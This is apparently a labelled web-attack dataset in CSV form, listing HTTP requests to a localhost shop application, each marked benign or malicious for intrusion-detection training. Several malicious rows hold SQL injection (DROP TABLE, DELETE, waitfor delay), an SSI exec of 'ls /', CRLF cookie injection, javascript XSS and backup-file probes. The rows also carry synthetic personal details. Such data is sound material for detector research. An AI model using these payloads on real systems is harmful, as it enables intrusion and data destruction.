Method,User-Agent,Pragma,Cache-Control,Accept,Accept-encoding,Accept-charset,language,host,cookie,content-type,connection,lenght,content,classification,URL,label,url_length,content_length
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=4272D3AE40D4A2B2E1FE4811F43F02A6,application/x-www-form-urlencoded,Connection: close,Content-Length: 8,id=%257C,1,http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1,malicious,66,8
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=2B06D435BF6489CAB5FCEBE7B0F9877D,,close,,,0,http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1,benign,59,0
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=580D336DE6D811286F20916A02F6861C,,close,,,0,http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,benign,67,0
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=84DD6944D706829B6F3EB1DE068553D2,,close,,,0,http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1,benign,58,0
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=39C3F07B19D1DF54F4DDBD645D6C83B2,,close,,,0,http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1,benign,59,0
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=33FB8F8F668CB588A54AB5F511F4CD09,application/x-www-form-urlencoded,Connection: close,Content-Length: 33,errorMsg=Credenciales+incorrectas,0,http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1,benign,57,33
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=D7D9767FA29AC5FF45CD7A72EBCB354D,,close,,,0,http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1,benign,65,0
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=5FA3C78ECF41116A031BFF6B5752376B,,close,,,1,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=%27+DELETE+FROM+USERS&precio=39&cantidad=21&B1=A%F1adir+al+carrito HTTP/1.1,malicious,136,0
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=8150132D27CAD822D2353C2CDA10F0B2,,close,,,0,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3549&B1=Pasar+por+caja HTTP/1.1,benign,100,0
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=C5DC0C8E975D732B4251604D55C15250,application/x-www-form-urlencoded,Connection: close,Content-Length: 76,id=2%2F&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=6&B1=A%F1adir+al+carrito,1,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,malicious,57,76
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=5CBDFBA923725DF58F0C20999059C915,application/x-www-form-urlencoded,Connection: close,Content-Length: 246,modo=registro&login=grainger&password=dilecci%F3n&nombre=%3FBa%27bel-i&apellidos=Rodamila&email=nazimova%40ibizasounds.sh&dni=47610956J&direccion=C%2F+Selva%2C+14%2C+5%3FF&ciudad=Farrera&cp=18290&provincia=Madrid&ntc=8021682596257423&B1=Registrar,1,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,malicious,58,246
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=1D1B8F54A7E385B5E7F160E9B53A6582,,close,,,1,http://localhost:8080/tienda1/4861362529278789730 HTTP/1.1,malicious,58,0
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=3528EC8AF5BCF425BBC310D00E52B9BD,,close,,,0,http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,benign,57,0
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=30BABBA261424CAE5654F6239F4A3495,,close,,,0,http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1,benign,58,0
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=7FCD7841791D156D512E832610DD442E,application/x-www-form-urlencoded,Connection: close,Content-Length: 4,id=2,0,http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1,benign,66,4
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=34BB148BBDBD528AA699793258AEA52E,,close,,,0,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=zuk&password=a297ril83&nombre=Feamma&apellidos=Pruja+Lantadilla&email=hagerthy.gilling%40inoxled.az&dni=95372776X&direccion=Plazuela+De+La+Fuente+Cantero+124+&ciudad=Villanueva+del+Campillo&cp=42223&provincia=Valencia&ntc=8545414312654589&B1=Registrar HTTP/1.1,benign,331,0
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=6570F4430080D1327E2DC25BA879D2D6,application/x-www-form-urlencoded,Connection: close,Content-Length: 321,modo=registro&login=schoen&password=cartear&nombre=Zaima&apellidos=Falgeras+Puerta&email=hargitay%40corjet.coop&dni=33685330J&direccion=Calle+Pedro+Salinas%2C+15%2C+6%3FH%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&ciudad=Bierge&cp=44155&provincia=C%E1ceres&ntc=2909791700288840&B1=Registrar,1,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,malicious,59,321
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=673FC56908213E08B5506721264B1932,,close,,,0,http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1,benign,59,0
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=47575BD74D3BCE5DBC3FF16A14E5D007,application/x-www-form-urlencoded,Connection: close,Content-Length: 64,modo=entrar&login=beehler&pwd=PenEtRAL&remember=off%2F&B1=Entrar,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,malicious,61,64
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=B6609878A23AD37879ED593DD7847A05,application/x-www-form-urlencoded,Connection: close,Content-Length: 247,modo=registro&login=bagnato33&password=prescindible&nombre=Hiram&apellidos=Penagos+Pijoan&email=fenell%40salsaspain.fr&dni=11130412E&direccion=C%2F+Leon+Pinelo%2C+5+3E&ciudad=Cordovilla&cp=10320&provincia=Navarra&ntcA=2582130639764727&B1=Registrar,1,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,malicious,59,247
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=0F61E241771E94656294A7D222BDF657,,close,,,0,http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,benign,55,0
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=FE8DDE0115F900153E72DC3647F7C967,,close,,,0,http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,benign,57,0
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=55BC488D59C80031BA870E82E725E0CC,,close,,,1,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=dombrosk&password=velu%21dillo&nombre=Quincio&apellidos=Rezabal&email=omiya_bogetti%40casablancabeach.gob&dni=77720635R&direccion=Calle+Arrozal+110%2C+3%3FG&ciudad=Artesa+de+Segre&cp=16336&provincia=Castell%F3nany%250ASet-cookie%253A%2BTamper%253D1041264011025374727&ntc=4597794127827518&B1=Registrar HTTP/1.1,malicious,380,0
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=C7F842C59FB75CA51393FA5C4A826EED,,close,,,1,http://localhost:8080/6909030637832563290.jsp.INC HTTP/1.1,malicious,58,0
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=EE0D462D9351BCB61F438BBA8E4DB853,,close,,,0,http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1,benign,60,0
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=F251FF934180D9B898131A24360543F7,application/x-www-form-urlencoded,Connection: close,Content-Length: 249,modo=registro&login=brackin&password=%24leo&nombreA=Clacer&apellidos=Roza+Port%E9s&email=argibay_galabrue7%40am-si.kn&dni=59004252Y&direccion=Pla%E7a+D%27+Hostafrancs+102+&ciudad=Arjonilla&cp=37338&provincia=Vizcaya&ntc=6040441906133947&B1=Registrar,1,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,malicious,58,249
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=9A28C59398B29C280E9C42C8D8EECE22,,close,,,1,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1,malicious,105,0
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=61817245E088699E7B574B21388C8210,,close,,,1,http://localhost:8080/tienda1/publico/autenticar.jsp/asf-logo-wide.gif/ HTTP/1.1,malicious,80,0
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=4C53FE7AD0F985134D355EB20F29359E,,close,,,0,http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1,benign,66,0
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=CC107EC9D37A53DE402E3AC1A74060AB,,close,,,0,http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1,benign,57,0
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=2996CE608D5A593CAF908C653FB6BFED,,close,,,0,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1,benign,91,0
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=490DC316377D6FFD59CD9588EBE3BF7C,application/x-www-form-urlencoded,Connection: close,Content-Length: 72,id=2&nombre=Queso+Manchego&precio=100&cantidad=85&B1=A%F1adir+al+carrito,0,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,benign,57,72
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=35340B4EDDDD1A3DA12E1DFC9EBE9921,,close,,,0,http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1,benign,58,0
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=D0E760907F4A7D158FBBA88375E0AE6C,,close,,,1,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=logntp&password=restitutorio&nombre=HuilliManque&apellidos=Cure+Lozana&email=t%40eomi%40doceros%40as.pk&dni=47051425A&direccion=C%2F+Lebrillo%2C+155%2C+4-A&ciudad=Olmedo+de+Camaces&cp=44589&provincia=Valladolid&ntc=6933033673510667&B1=Registrar HTTP/1.1,malicious,324,0
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=483AE0D6CCFD57F7073F9D71737CBA19,,close,,,1,http://localhost:8080/tienda1/publico/miembros.jsp/ HTTP/1.1,malicious,60,0
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=7379849F105347F2DEA7D33180543774,,close,,,0,http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1,benign,59,0
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=8ED67BD7D066B8102E4A6BB6C36580E7,application/x-www-form-urlencoded,Connection: close,Content-Length: 327,modo=registro&login=olivie&password=re0348n1AR&nombre=Ivan&apellidos=Elbar+Brice%F1o&email=elliot3%40connect.li&dni=65683923V&direccion=Los+Caminos%2C+129%2C+13-G&ciudad=Hinojosa+del+Campo&cp=10130&provincia=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&ntc=7487181086019639&B1=Registrar,1,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,malicious,58,327
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=0B2D6A46EA64D5EA6D415B41E55F731A,application/x-www-form-urlencoded,Connection: close,Content-Length: 69,modo=entrar&login=arlan&pwd=9.84Is22Nte334c799&remember=off&B1=Entrar,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,benign,61,69
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=CEF3E012336154D372A8F4BAB6F7B14D,application/x-www-form-urlencoded,Connection: close,Content-Length: 71,id=3&nombre=Queso+Manchego&precio=100&cantidad=2&B1=A%F1adir+al+carrito,0,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,benign,57,71
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=793E696FF5329F78B64F8FAC3807F806,,close,,,0,http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1,benign,59,0
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=DEACB256FE84DEA57DEBE109167E228E,application/x-www-form-urlencoded,Connection: close,Content-Length: 75,idA=2&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=75&B1=A%F1adir+al+carrito,1,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,malicious,57,75
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=99A67B914BC833F498D77A6C30BF8AFF,,close,,,0,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=39&cantidad=95&B1=A%F1adir+al+carrito HTTP/1.1,benign,129,0
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=59F0DDCA85A72BF1AB9FCA842E8D7D1B,,close,,,0,http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1,benign,56,0
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=B71B32CCE28849D0B7B4FCBBDE5A3294,,close,,,0,http://localhost:8080/tienda1/index.jsp HTTP/1.1,benign,48,0
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=0B3033421413CE9FFC3BA7ED8D7AAD25,,close,,,1,http://localhost:8080/tienda1/global/estilos.css.old HTTP/1.1,malicious,61,0
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=C5BE6671F15E8FEB764FB91D3659B976,,close,,,1,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1,malicious,110,0
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=B1BB3D67A26C0BAB70338DC320AF7B3D,,close,,,0,http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,benign,55,0
